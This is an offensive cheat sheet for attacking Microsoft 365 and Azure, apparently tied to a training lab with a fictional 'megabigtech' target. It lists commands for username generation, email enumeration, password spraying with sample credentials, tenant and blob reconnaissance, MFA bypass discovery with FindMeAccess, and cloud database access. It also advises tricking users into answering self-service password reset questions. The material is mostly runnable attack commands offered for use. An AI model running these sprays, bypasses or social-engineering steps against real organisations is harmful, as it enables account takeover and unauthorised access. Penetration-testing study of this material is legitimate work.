### Username-Anarch
```
./username-anarchy Jordan Kim -@ @megabigtech.com
./username-anarchy --country france --auto
```
### Email Checker
Identify Valid Domain Email Address
```
python3 oh365userfinder.py -r emails.txt
python3 o365enum.py -u email.txt -m office.com
```
### M365 Password Spray
```
python3 o365spray.py -u 'yuki.tanaka@megabigtech.com' -p 'MegaDev79$' --lockout 1 --spray --spray-module=rst -d megabigtech.com
activesync	https://outlook.office365.com/
adfs	Currently not implemented
autodiscover	https://autodiscover-s.outlook.com/
autologon	https://autologon.microsoftazuread-sso.com/
oauth2	https://login.microsoftonline.com/
reporting	https://reports.office365.com/
rst	https://login.microsoftonline.com/

activesync = https://partner.outlook.cn/
autodiscover = https://autodiscover-s.partner.outlook.cn/
autologon = https://autologon.microsoftazuread-sso.com/
oauth2 = https://login.partner.microsoftonline.cn/
rst = https://login.partner.microsoftonline.cn/
```
```
Import-Module MSOLSpray.ps1
Invoke-MSOLSpray -UserList .\userlist.txt -Password Winter2020
```
### Microsoft Entra Self-Service Password Reset (SSPR)
>Microsoft Entra self-service password reset (SSPR) gives users the ability to change or reset their password, with no administrator or help desk involvement. If a user's account is locked or they forget their password, they can follow prompts to unblock themselves and get back to work.

https://aka.ms/sspr  
Then trick user to answer 3 security question

### My Apps
https://myapps.microsoft.com/index.htm to check which services this account can access.  
21Vianet: https://myapplications.windowsazure.cn
### Tenant Id Convert to Tenant
```
https://osint.aadinternals.com/  
https://login.microsoftonline.com/$domain/.well-known/openid-configuration
```
### Domain Info
```
Value	Description
DNS	Does the DNS record exist?
MX	Does the MX point to Office 365?
SPF	Does the SPF contain Exchange Online?
Type	Federated or Managed
DMARC	Is the DMARC record configured?
DKIM	Is the DKIM record configured?
MTA-STS	Is the MTA-STS recored configured?
STS	The FQDN of the federated IdP’s (Identity Provider) STS (Security Token Service) server
RPS	Relaying parties of STS (AD FS). Requires -GetRelayingParties switch.

Invoke-AADIntReconAsOutsider -DomainName megabigtech.com
```
### SubDomain Finder
```
python3 azsubenum.py -b megabigtech --thread 10 -p permutations.txt
```
### Azure Blob Finder
**Usage**  
Create a file with account name and container name strings that you wish to enumerate. The file should have one entry per line, and can be in one of two formats:    

* name - When a single string is specified, Basic Blob Finder will use the string as both the account name and the container name.  
* account:container - When a colon is used to separate two strings, the first string is used to test as the account name; the second is used as the container name.  
```
for word in $(cat ../AzSubEnum/permutations.txt); do echo megabigtechinternal:$word >> namelist; done
python3 basicblobfinder.py namelist
```
### Checking Managed Domain or Federated Domain
```
curl "https://login.microsoftonline.com/getuserrealm.srf?login=international-am.com&json=1"
```
### IPInfo
```
Invoke-WebRequest -Uri "https://ipinfo.io/20.75.112.13" | Select-Object -ExpandProperty Content
curl https://ipinfo.io/20.75.112.13
curl --silent 'https://azservicetags.azurewebsites.net/api/iplookup?ipAddresses=20.75.112.13' | jq
```
### MFA Gap Finder - FindMeAccess
Unknown User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; NOKIA; Lumia 920  
```
python3 findmeaccess.py audit -u edrian.taylor@megabigtech.com -p 'INeedAHoliday@Bahamas' -c 04b07795-8ddb-461a-bbee-02f9e1bf7b46(client id for azure cli) -r https://management.azure.com(optional) --ua_all

Link of a list of client id:https://learn.microsoft.com/en-us/power-platform/admin/apps-to-allow

cat edrian.taylor@megabigtech.com-accessible.txt

python3 findmeaccess.py token -u edrian.ta2ylor@megabigtech.com -p 'INeedAHoliday@Bahamas' -c 04b07795-8ddb-461a-bbee-02f9e1bf7b46 -r https://management.azure.com --user_agent "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.178 Mobile Safari/537.36"
```
List Resources
```
python3 ./findmeaccess.py audit --list_resources                                           
```
### SQLCMD
Connect to Azure MSSQL Server
```
sqlcmd -S tcp:azsrvfw-2506-azsql.database.windows.net,1433 -d azsrvfwMSSQLdb -U reader -P 'xxxxxx'
```
Queries
```
mssql server queries;
go
```
### PSQL
Connect to Azure PostgreSQL Database
```
psql 'Connection_String'
```
### Cosmosdb_Curling.py
1. python3 cosmosdb_curling.py --connection-string $connection_string --operation list-dbs
2. python3 cosmosdb_curling.py --connection-string $connection_string --operation list-colls --database ToDoList92
3. python3 cosmosdb_curling.py --connection-string $connection_string --operation list-docs --database ToDoList --collection Temp
